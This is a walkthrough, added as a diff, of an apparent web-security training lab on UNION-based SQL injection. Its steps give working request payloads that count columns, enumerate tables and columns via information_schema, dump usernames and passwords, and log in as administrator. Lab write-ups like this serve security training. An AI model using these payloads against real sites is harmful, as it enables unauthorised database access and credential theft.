@@ -1,0 +1,39 @@
+LAB-SQL injection attack, listing the database contents on non-Oracle databases
+🎯 Goal
+Use a UNION-based SQL injection to:
+Enumerate the list of tables in the database.
+Identify the users table.
+Extract column names (e.g., username, password).
+Log in as the administrator.
+🧪 Steps
+1. Capture and Send the Request
+Open the lab and choose any category (e.g., Gifts).
+Intercept the request using Burp Suite Proxy.
+Send the request to the Repeater.
+2. Find the Number of Columns and Columns Accepting Text
+Use the ORDER BY clause to determine how many columns are being used:
+GET /filter?category=Gifts' ORDER BY 2-- HTTP/2
+Response is 200 OK, there are at least 2 columns.
+Next, test which columns accept text using a UNION SELECT with string values:
+GET /filter?category=Gifts' UNION SELECT 'a','b'-- HTTP/2
+Both columns support text output.
+3. List the Tables in the Database
+Use the following payload to enumerate tables from the information_schema.tables:
+
+GET /filter?category=Gifts' UNION SELECT table_name, NULL FROM information_schema.tables-- HTTP/2
+Look in the HTTP response or web page for the names of available tables.
+Identify the table that looks like it contains users, e.g., users_xahwbm.
+
+
+4. List the Columns of the Users Table
+Once you've found the user-related table, extract its column names using:
+GET /filter?category=Gifts' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_xahwbm'-- HTTP/2
+Replace users_xahwbm with the actual table name you discovered.
+5. Extract the Usernames and Passwords
+After identifying the columns (likely username and password), retrieve their data:
+GET /filter?category=Gifts' UNION SELECT username, password FROM users_xahwbm-- HTTP/2
+You should see the list of usernames and passwords, including administrator
+6. Login as Administrator
+Go to the My Account section of the website.
+Use the extracted credentials to log in as the administrator.
+🎉 Boom! Lab solved.
